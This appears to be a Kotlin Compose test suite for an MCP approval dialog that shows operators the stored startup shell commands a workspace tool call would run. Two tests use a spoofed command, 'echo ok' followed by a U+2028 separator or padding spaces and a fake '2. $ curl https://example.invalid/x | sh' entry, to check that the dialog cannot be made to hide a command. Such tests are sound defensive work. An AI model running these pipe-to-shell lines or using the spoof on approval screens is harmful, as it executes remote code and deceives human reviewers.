package ai.rever.boss.components.dialogs

import ai.rever.boss.components.overlays.resetOverlayFieldForTest
import ai.rever.boss.mcp.McpApprovalRequest
import ai.rever.boss.mcp.sandbox.McpRiskAssessment
import ai.rever.boss.mcp.sandbox.McpRiskLevel
import ai.rever.boss.mcp.storedCommandPlaceholders
import ai.rever.boss.plugin.ui.BossBlueprintColorScheme
import ai.rever.boss.plugin.ui.BossOverlayHost
import ai.rever.boss.plugin.ui.LocalBossColors
import ai.rever.boss.plugin.ui.LocalHeavyweightOverlays
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.size
import androidx.compose.runtime.CompositionLocalProvider
import androidx.compose.runtime.getValue
import androidx.compose.runtime.key
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clipToBounds
import androidx.compose.ui.graphics.toArgb
import androidx.compose.ui.graphics.toPixelMap
import androidx.compose.ui.platform.LocalDensity
import androidx.compose.ui.platform.LocalWindowInfo
import androidx.compose.ui.platform.WindowInfo
import androidx.compose.ui.semantics.SemanticsActions
import androidx.compose.ui.semantics.SemanticsProperties
import androidx.compose.ui.test.assertIsDisplayed
import androidx.compose.ui.test.assertTextEquals
import androidx.compose.ui.test.captureToImage
import androidx.compose.ui.test.junit4.createComposeRule
import androidx.compose.ui.test.onNodeWithTag
import androidx.compose.ui.test.onNodeWithText
import androidx.compose.ui.test.onRoot
import androidx.compose.ui.test.performSemanticsAction
import androidx.compose.ui.text.TextLayoutResult
import androidx.compose.ui.unit.Density
import androidx.compose.ui.unit.IntSize
import androidx.compose.ui.unit.dp
import org.junit.After
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import java.awt.image.BufferedImage
import java.io.File
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * The approval dialog lists the stored startup commands a call would run, in full, so the
 * operator approves commands and not an id. Set `BOSS_REVIEW_CAPTURE=1` to write the rendered
 * dialog to `build/reports/mcp-review`.
 */
class McpApprovalDialogStoredCommandsTest {
    @get:Rule val rule = createComposeRule()
    private val previousRenderer = BossOverlayHost.modalRenderer
    private val previousHeavyweight = BossOverlayHost.useHeavyweightOverlays

    @Before fun setup() {
        resetOverlayFieldForTest("modalRenderer")
        resetOverlayFieldForTest("useHeavyweightOverlays")
        BossOverlayHost.useHeavyweightOverlays = true
        BossOverlayHost.modalRenderer = { _, _, content -> content() }
    }

    @After fun cleanup() {
        resetOverlayFieldForTest("modalRenderer")
        resetOverlayFieldForTest("useHeavyweightOverlays")
        BossOverlayHost.modalRenderer = previousRenderer
        BossOverlayHost.useHeavyweightOverlays = previousHeavyweight
    }

    private fun show(request: McpApprovalRequest) {
        rule.setContent {
            CompositionLocalProvider(
                LocalHeavyweightOverlays provides true,
                LocalDensity provides Density(1f),
                LocalBossColors provides BossBlueprintColorScheme,
                LocalWindowInfo provides
                    object : WindowInfo {
                        override val isWindowFocused = true
                        override val containerSize = IntSize(720, 900)
                    },
            ) {
                Box(Modifier.size(720.dp, 900.dp).clipToBounds()) {
                    McpApprovalDialog(request = request, onApprove = { _, _, _ -> }, onDeny = { _, _ -> })
                }
            }
        }
        rule.mainClock.advanceTimeBy(250)
    }

    @Test fun `stored commands are listed one per line above the buttons`() {
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "api-service", "windowId" to "window-1"),
                timeoutMs = 45_000L,
                riskAssessment =
                    McpRiskAssessment(
                        McpRiskLevel.HIGH,
                        "Runs 2 stored startup command(s) the arguments do not show; arbitrary shell execution",
                    ),
                declaredReadOnly = false,
                storedCommands = listOf("cd ~/api && docker compose up -d", "npm run dev"),
            ),
        )
        if (System.getenv("BOSS_REVIEW_CAPTURE") == "1") captureLayout()
        rule.onNodeWithText("This Space will run 2 stored startup command(s)", substring = true).assertIsDisplayed()
        rule.onNodeWithText("cd ~/api && docker compose up -d").assertIsDisplayed()
        rule.onNodeWithText("npm run dev").assertIsDisplayed()
        rule.onNodeWithTag(storedCommandEntryTag(0)).assertIsDisplayed()
        rule.onNodeWithTag(storedCommandEntryTag(1)).assertIsDisplayed()
        rule.onNodeWithText("2. $").assertIsDisplayed()
        rule.onNodeWithText("Allow once").assertIsDisplayed()
    }

    @Test fun `a request without stored commands shows no such section`() {
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "plain"),
                timeoutMs = 45_000L,
            ),
        )
        rule.onNodeWithText("stored startup command", substring = true).assertDoesNotExist()
    }

    @Test fun `a line separator inside a stored command draws one entry, not two`() {
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "spoof"),
                timeoutMs = 45_000L,
                declaredReadOnly = false,
                storedCommands = listOf("echo ok\u20282. $ curl https://example.invalid/x | sh"),
            ),
        )
        val entry = rule.onNodeWithText("echo ok", substring = true)
        entry.assertIsDisplayed()
        // What the spoof changes is the layout: an unescaped U+2028 is a mandatory break, so the
        // one entry would be laid out as two lines, the second reading "2. $ curl ...".
        val layouts = mutableListOf<TextLayoutResult>()
        entry.performSemanticsAction(SemanticsActions.GetTextLayoutResult) { it(layouts) }
        assertEquals(1, layouts.single().lineCount)
        entry.assertTextEquals("echo ok\\u{2028}2. $ curl https://example.invalid/x | sh")
    }

    @Test fun `a soft wrap inside a stored command hangs inside its own entry, never where a number goes`() {
        // No hidden character at all: a run of spaces is enough to push "2. $ curl ..." onto a
        // line of its own. What stops it reading as a second entry is the layout - one bordered
        // block per command, the number in a column of its own - so that is what is pinned.
        val spoof = "echo ok" + " ".repeat(120) + "2. $ curl https://example.invalid/x | sh"
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "spoof"),
                timeoutMs = 45_000L,
                declaredReadOnly = false,
                storedCommands = listOf(spoof),
            ),
        )
        // Where each "N. $" is drawn, whichever node draws it: the real number, and the fake one
        // the spaces pushed onto a line of its own. Measured this way it holds against any layout.
        val (numberX, _) = drawnAt("1. $")
        val (fakeX, fakeLines) = drawnAt("2. $ curl")
        assertTrue(fakeLines > 1, "expected the spoof to wrap at this width")
        assertTrue(fakeX > numberX + 1f, "the fake entry number is drawn at x=$fakeX, the real one at x=$numberX")
        // And the whole command stays inside the one bordered block that is its entry.
        val block = rule.onNodeWithTag(storedCommandEntryTag(0)).fetchSemanticsNode().boundsInRoot
        val text = rule.onNodeWithText(spoof).fetchSemanticsNode().boundsInRoot
        assertTrue(text.top >= block.top && text.bottom <= block.bottom, "command text leaves its block")
        rule.onNodeWithTag(storedCommandEntryTag(1)).assertDoesNotExist()
        rule.onNodeWithText("2. $").assertDoesNotExist()
    }

    @Test fun `commands carrying placeholders say they are filled in on open`() {
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "api-service"),
                timeoutMs = 45_000L,
                declaredReadOnly = false,
                storedCommands = listOf("cd {projectPath} && ./run"),
            ),
        )
        rule
            .onNodeWithText(
                "{projectPath} is filled in when the Space opens, from the project it opens in " +
                    "({projectPath} as one shell-quoted argument).",
            ).assertIsDisplayed()
    }

    @Test fun `commands without placeholders carry no such note`() {
        assertEquals(emptyList(), storedCommandPlaceholders(listOf("npm run dev")))
        assertEquals(
            "{currentFile}, {gitRemoteUrl} are filled in when the Space opens, from the project it opens in.",
            storedCommandsPlaceholderNote(listOf("{currentFile}", "{gitRemoteUrl}")),
        )
    }

    @Test fun `the scrollbar gate is off for a list that fits and on for one that does not`() {
        // Pure arithmetic, so it is right on the first frame; a ScrollState read would say
        // "scrollable" for both of these (see ToolLauncherDialog in AGENTS.md).
        assertFalse(storedCommandsOverflow(listOf("npm run dev", "docker compose up -d")))
        assertTrue(storedCommandsOverflow(List(7) { "echo $it" }))
        // One long command is past the box on its own, even at more characters per line than any
        // line holds.
        assertTrue(storedCommandsOverflow(listOf("x".repeat(700))))
    }

    @Test fun `the arithmetic is a lower bound, so it never counts a line the layout does not draw`() {
        // Four 50-character commands draw one line each and fit; the old 42 characters per line
        // counted two each and pinned a full-length thumb over a box with nothing to scroll.
        assertFalse(storedCommandsOverflow(List(4) { "x".repeat(50) }))
        // A combining mark draws on the glyph before it, so it is not a character of the line:
        // 250 accented letters are 500 UTF-16 units, seven lines by that count and four by glyphs.
        assertFalse(storedCommandsOverflow(listOf("e\u0301".repeat(250))))
        assertTrue(storedCommandsOverflow(listOf("e".repeat(500))))
    }

    @Test fun `five short commands overflow the box, counting each entry's chrome, and four fit`() {
        // Each entry is a line plus its own padding, and entries are spaced apart: six text lines
        // was the old gate's whole budget, and five one-line entries already overflow the box.
        assertTrue(storedCommandsOverflow(List(5) { "npm run dev" }))
        assertFalse(storedCommandsOverflow(List(4) { "npm run dev" }))
        assertFalse(storedCommandsOverflow(listOf("cd ~/api && docker compose up -d", "npm run dev", "make watch")))
    }

    @Test fun `a larger font shows the bar sooner`() {
        // Four fit at the default size; at 1.5x the same four do not.
        assertFalse(storedCommandsOverflow(List(4) { "npm run dev" }, fontScale = 1f))
        assertTrue(storedCommandsOverflow(List(4) { "npm run dev" }, fontScale = 1.5f))
    }

    @Test fun `the bar is pinned whenever the rendered entries run past the box, however the text wraps`() {
        // Checked against the real layout and the rendered decision, not the arithmetic's own
        // assumptions: whenever the last entry's bottom lies past the box's inner edge the operator
        // has text below the fold, and the box must have pinned its scrollbar.
        val token = "abcdefghijklmnopqrstuvwxyz0123"
        val cases =
            (1..8).map { n -> List(n) { "npm run dev $it" } to 1f } +
                listOf(
                    listOf("x".repeat(180)) to 1f,
                    listOf("y".repeat(300), "npm run dev") to 1f,
                    // Word wrap: seven 30-character tokens wrap to seven lines where characters
                    // per line counts six, so the arithmetic alone under-reports this one.
                    listOf(List(7) { token }.joinToString(" ")) to 1f,
                    listOf(List(7) { token }.joinToString(" "), "npm run dev") to 1f,
                    // A larger font: fewer glyphs per line and taller lines than the arithmetic's
                    // 42 characters assume.
                    List(3) { "npm run dev --port 300$it --host 0.0.0.0" } to 1.5f,
                    listOf(List(4) { token }.joinToString(" "), "make watch") to 1.3f,
                )
        var commands by mutableStateOf(cases.first().first)
        var fontScale by mutableStateOf(1f)
        rule.setContent {
            CompositionLocalProvider(
                LocalHeavyweightOverlays provides true,
                LocalDensity provides Density(1f, fontScale),
                LocalBossColors provides BossBlueprintColorScheme,
                LocalWindowInfo provides
                    object : WindowInfo {
                        override val isWindowFocused = true
                        override val containerSize = IntSize(720, 900)
                    },
            ) {
                Box(Modifier.size(720.dp, 900.dp).clipToBounds()) {
                    McpApprovalDialog(
                        request =
                            McpApprovalRequest(
                                toolName = "open_workspace",
                                providerId = "boss-workspace",
                                arguments = mapOf("workspaceId" to "api-service"),
                                timeoutMs = 45_000L,
                                declaredReadOnly = false,
                                storedCommands = commands,
                            ),
                        onApprove = { _, _, _ -> },
                        onDeny = { _, _ -> },
                    )
                }
            }
        }
        val hidden = mutableListOf<String>()
        for ((list, scale) in cases) {
            commands = list
            fontScale = scale
            rule.waitForIdle()
            val box = rule.onNodeWithTag(STORED_COMMANDS_BOX_TAG).fetchSemanticsNode()
            val last = rule.onNodeWithTag(storedCommandEntryTag(list.lastIndex)).fetchSemanticsNode()
            // Unclipped: position plus size, not boundsInRoot, which the box clips.
            val lastBottom = last.positionInRoot.y + last.size.height
            val innerBottom = box.positionInRoot.y + box.size.height - STORED_COMMANDS_BOX_INNER_PADDING_PX
            val overflows = lastBottom > innerBottom + 0.5f
            if (overflows && !box.config[StoredCommandsScrollbarPinned]) {
                val chars = list.sumOf { it.length }
                hidden += "${list.size} entries, $chars chars, font x$scale: $lastBottom > $innerBottom"
            }
        }
        assertTrue(hidden.isEmpty(), "text below the fold with no bar:\n" + hidden.joinToString("\n"))
    }

    @Test fun `with a fresh composition per list, the bar is pinned exactly when the entries run past the box`() {
        // Both directions, each list in a composition of its own (`key`), so a scroll range left
        // over from a larger list can neither pin a bar here nor hide one. The reverse direction
        // is the one the gate's arithmetic used to fail: at 42 characters per line it pinned a
        // full-length thumb over lists like the first two, which fit.
        val token = "abcdefghijklmnopqrstuvwxyz0123"
        val cases =
            listOf(
                List(4) { "x".repeat(50) } to 1f,
                List(3) { "cd ~/services/api-gateway && docker compose up --build -d" } to 1f,
                listOf("y".repeat(110), "npm run dev") to 1f,
                List(4) { "npm run dev --port 300$it" } to 1f,
                List(5) { "npm run dev --port 300$it" } to 1f,
                listOf(List(7) { token }.joinToString(" ")) to 1f,
                List(3) { "npm run dev" } to 1.3f,
                List(4) { "npm run dev" } to 1.5f,
                listOf("e\u0301".repeat(60), "make watch") to 1f,
            )
        var index by mutableStateOf(0)
        var fontScale by mutableStateOf(1f)
        rule.setContent {
            CompositionLocalProvider(
                LocalHeavyweightOverlays provides true,
                LocalDensity provides Density(1f, fontScale),
                LocalBossColors provides BossBlueprintColorScheme,
                LocalWindowInfo provides
                    object : WindowInfo {
                        override val isWindowFocused = true
                        override val containerSize = IntSize(720, 900)
                    },
            ) {
                Box(Modifier.size(720.dp, 900.dp).clipToBounds()) {
                    key(index) {
                        McpApprovalDialog(
                            request = storedCommandsRequest(cases[index].first),
                            onApprove = { _, _, _ -> },
                            onDeny = { _, _ -> },
                        )
                    }
                }
            }
        }
        val wrong = mutableListOf<String>()
        var fitting = 0
        for ((i, case) in cases.withIndex()) {
            index = i
            fontScale = case.second
            rule.waitForIdle()
            val overflows = rendersPastTheBox(case.first.lastIndex)
            val box = rule.onNodeWithTag(STORED_COMMANDS_BOX_TAG).fetchSemanticsNode()
            val pinned = box.config[StoredCommandsScrollbarPinned]
            if (!overflows) fitting++
            if (pinned != overflows) wrong += "case $i (font x${case.second}): overflows=$overflows, pinned=$pinned"
        }
        assertTrue(wrong.isEmpty(), wrong.joinToString("\n"))
        assertTrue(fitting >= 4, "only $fitting of the lists fit, so the reverse direction was barely tested")
    }

    @Test fun `a bar only the measurement finds is drawn at once, not faded in seconds later`() {
        // Eight 40-character tokens: two cannot share a line in any monospace font, so they draw
        // eight lines where the arithmetic's lower bound counts five. Only the measured range pins
        // this one, and the panel's default fade would have kept the bar invisible for 1.5 s.
        val token = "abcdefghijklmnopqrstuvwxyz0123456789abcd"
        val commands = listOf(List(8) { token }.joinToString(" "))
        assertFalse(storedCommandsOverflow(commands), "precondition: the arithmetic alone misses this list")
        rule.mainClock.autoAdvance = false
        show(storedCommandsRequest(commands))
        // show() has advanced 250 ms: a few frames, far short of the fade's delay.
        assertTrue(rendersPastTheBox(commands.lastIndex))
        val box = rule.onNodeWithTag(STORED_COMMANDS_BOX_TAG).fetchSemanticsNode()
        assertTrue(box.config[StoredCommandsScrollbarPinned])
        assertTrue(scrollbarDrawn(), "the box pinned its bar, but none is drawn 250 ms in")
    }

    @Test fun `a list that fits pins no bar`() {
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "api-service"),
                timeoutMs = 45_000L,
                declaredReadOnly = false,
                storedCommands = listOf("npm run dev", "make watch"),
            ),
        )
        rule.waitForIdle()
        val box = rule.onNodeWithTag(STORED_COMMANDS_BOX_TAG).fetchSemanticsNode()
        assertFalse(box.config[StoredCommandsScrollbarPinned])
        assertFalse(scrollbarDrawn(), "a bar is drawn over a list that fits")
    }

    private fun storedCommandsRequest(commands: List<String>) =
        McpApprovalRequest(
            toolName = "open_workspace",
            providerId = "boss-workspace",
            arguments = mapOf("workspaceId" to "api-service"),
            timeoutMs = 45_000L,
            declaredReadOnly = false,
            storedCommands = commands,
        )

    /** Whether the entry at [lastIndex] ends past the box's inner edge: text below the fold. */
    private fun rendersPastTheBox(lastIndex: Int): Boolean {
        val box = rule.onNodeWithTag(STORED_COMMANDS_BOX_TAG).fetchSemanticsNode()
        val last = rule.onNodeWithTag(storedCommandEntryTag(lastIndex)).fetchSemanticsNode()
        // Unclipped: position plus size, not boundsInRoot, which the box clips.
        val lastBottom = last.positionInRoot.y + last.size.height
        val innerBottom = box.positionInRoot.y + box.size.height - STORED_COMMANDS_BOX_INNER_PADDING_PX
        return lastBottom > innerBottom + 0.5f
    }

    /**
     * Whether a scrollbar is drawn in the box: the pixels where the thumb goes, at the top of the
     * right-hand padding strip, differ from the box's own background in the left-hand one.
     */
    private fun scrollbarDrawn(): Boolean {
        val pixels = rule.onNodeWithTag(STORED_COMMANDS_BOX_TAG).captureToImage().toPixelMap()
        return pixels[pixels.width - 3, 10] != pixels[3, pixels.height / 2]
    }

    /** The x at which [snippet] starts in the one node whose text contains it, and that node's line count. */
    private fun drawnAt(snippet: String): Pair<Float, Int> {
        val node = rule.onNodeWithText(snippet, substring = true)
        val semantics = node.fetchSemanticsNode()
        val text = semantics.config[SemanticsProperties.Text].joinToString("") { it.text }
        val layouts = mutableListOf<TextLayoutResult>()
        node.performSemanticsAction(SemanticsActions.GetTextLayoutResult) { it(layouts) }
        val layout = layouts.single()
        return (semantics.boundsInRoot.left + layout.getHorizontalPosition(text.indexOf(snippet), true)) to
            layout.lineCount
    }

    private companion object {
        /** The box's own padding, in px at the test's density of 1. */
        const val STORED_COMMANDS_BOX_INNER_PADDING_PX = 6f
    }

    private fun captureLayout() {
        val pixels = rule.onRoot().captureToImage().toPixelMap()
        val image = BufferedImage(pixels.width, pixels.height, BufferedImage.TYPE_INT_ARGB)
        for (y in 0 until pixels.height) for (x in 0 until pixels.width) image.setRGB(x, y, pixels[x, y].toArgb())
        val output = File("build/reports/mcp-review", "${javaClass.simpleName}.png")
        output.parentFile.mkdirs()
        javax.imageio.ImageIO.write(image, "png", output)
    }
}
